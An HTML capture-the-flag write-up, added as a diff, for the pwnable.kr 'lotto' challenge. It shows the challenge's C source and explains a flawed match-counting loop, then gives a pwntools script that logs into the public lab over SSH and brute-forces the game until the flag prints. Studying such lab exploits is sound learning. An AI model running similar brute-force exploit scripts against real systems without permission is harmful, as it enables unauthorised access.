@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../css/style.css">
+  </head>
+
+<h1 id="lotto">lotto</h1>
+<p>4th April 2022</p>
+<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span>
+
+<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> submit[<span class="hljs-number">6</span>];
+
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">play</span><span class="hljs-params">()</span></span>{
+
+        <span class="hljs-keyword">int</span> i;
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Submit your 6 lotto bytes : "</span>);
+        fflush(<span class="hljs-built_in">stdout</span>);
+
+        <span class="hljs-keyword">int</span> r;
+        r = read(<span class="hljs-number">0</span>, submit, <span class="hljs-number">6</span>);
+
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Lotto Start!\n"</span>);
+        <span class="hljs-comment">//sleep(1);</span>
+
+        <span class="hljs-comment">// generate lotto numbers</span>
+        <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">"/dev/urandom"</span>, O_RDONLY);
+        <span class="hljs-keyword">if</span>(fd==<span class="hljs-number">-1</span>){
+                <span class="hljs-built_in">printf</span>(<span class="hljs-string">"error. tell admin\n"</span>);
+                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);
+        }
+        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> lotto[<span class="hljs-number">6</span>];
+        <span class="hljs-keyword">if</span>(read(fd, lotto, <span class="hljs-number">6</span>) != <span class="hljs-number">6</span>){
+                <span class="hljs-built_in">printf</span>(<span class="hljs-string">"error2. tell admin\n"</span>);
+                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);
+        }
+        <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">6</span>; i++){
+                lotto[i] = (lotto[i] % <span class="hljs-number">45</span>) + <span class="hljs-number">1</span>;         <span class="hljs-comment">// 1 ~ 45</span>
+        }
+        close(fd);
+
+        <span class="hljs-comment">// calculate lotto score</span>
+        <span class="hljs-keyword">int</span> match = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>;
+        <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">6</span>; i++){
+                <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">6</span>; j++){
+                        <span class="hljs-keyword">if</span>(lotto[i] == submit[j]){
+                                match++;
+                        }
+                }
+        }
+
+        <span class="hljs-comment">// win!</span>
+        <span class="hljs-keyword">if</span>(match == <span class="hljs-number">6</span>){
+                system(<span class="hljs-string">"/bin/cat flag"</span>);
+        }
+        <span class="hljs-keyword">else</span>{
+                <span class="hljs-built_in">printf</span>(<span class="hljs-string">"bad luck...\n"</span>);
+        }
+
+}
+
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">help</span><span class="hljs-params">()</span></span>{
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"- nLotto Rule -\n"</span>);
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"nlotto is consisted with 6 random natural numbers less than 46\n"</span>);
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"your goal is to match lotto numbers as many as you can\n"</span>);
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"if you win lottery for *1st place*, you will get reward\n"</span>);
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"for more details, follow the link below\n"</span>);
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n"</span>);
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"mathematical chance to win this game is known to be 1/8145060.\n"</span>);
+}
+
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span>{
+
+        <span class="hljs-comment">// menu</span>
+        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> menu;
+
+        <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>){
+
+                <span class="hljs-built_in">printf</span>(<span class="hljs-string">"- Select Menu -\n"</span>);
+                <span class="hljs-built_in">printf</span>(<span class="hljs-string">"1. Play Lotto\n"</span>);
+                <span class="hljs-built_in">printf</span>(<span class="hljs-string">"2. Help\n"</span>);
+                <span class="hljs-built_in">printf</span>(<span class="hljs-string">"3. Exit\n"</span>);
+
+                <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;menu);
+
+                <span class="hljs-keyword">switch</span>(menu){
+                        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:
+                                play();
+                                <span class="hljs-keyword">break</span>;
+                        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:
+                                help();
+                                <span class="hljs-keyword">break</span>;
+                        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:
+                                <span class="hljs-built_in">printf</span>(<span class="hljs-string">"bye\n"</span>);
+                                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+                        <span class="hljs-keyword">default</span>:
+                                <span class="hljs-built_in">printf</span>(<span class="hljs-string">"invalid menu\n"</span>);
+                                <span class="hljs-keyword">break</span>;
+                }
+        }
+        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+<p>The problem is here.<br>Each lotto value is compared to all 6 of our submitted values.<br>So if we submit 6 <code>+</code>s, and <code>+</code> is present in the random lotto numbers just once, we&#39;ll get 6 matches and win the lottery.</p>
+<pre><code class="lang-c">        <span class="hljs-comment">// calculate lotto score</span>
+        int match = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>;
+        for(i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">6</span>; i++){
+                for(j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">6</span>; j++){
+                        if(lotto[i] == submit[j]){
+                                match++;
+                        }
+                }
+        }
+</code></pre>
+
+<pre><code class="lang-python"><span class="hljs-meta">#!/usr/bin/env python2</span>
+from pwn import *
+context.log_level = '<span class="hljs-keyword">debug</span>'
+
+sh = ssh(<span class="hljs-string">"lotto"</span>, <span class="hljs-string">"pwnable.kr"</span>, password=<span class="hljs-string">"guest"</span>, port=<span class="hljs-number">2222</span>)
+
+<span class="hljs-meta"># Don't break the pwnable.kr rules and let this run for longer than 1 minute</span>
+<span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:
+    io = sh.process(<span class="hljs-string">"/home/lotto/lotto"</span>)
+    io.recv()
+    io.sendline(b<span class="hljs-string">"1"</span>)
+    io.recv()
+    io.sendline(b<span class="hljs-string">"!!!!!!"</span>)   <span class="hljs-meta"># First writable ASCII &lt; 46 is !</span>
+    io.recvline()
+    <span class="hljs-keyword">output</span> = io.recvline()
+    <span class="hljs-keyword">if</span> b<span class="hljs-string">"bad luck"</span> <span class="hljs-keyword">not</span> in <span class="hljs-keyword">output</span>:
+        <span class="hljs-keyword">print</span>(<span class="hljs-keyword">output</span>)
+        <span class="hljs-keyword">break</span>
+    io.<span class="hljs-built_in">close</span>()
+
+io.<span class="hljs-built_in">close</span>()
+sh.<span class="hljs-built_in">close</span>()
+</code></pre>
+
+<p>My bruteforce script is pretty broken. Had to put pwntools into debug mode to see the flag output.</p>
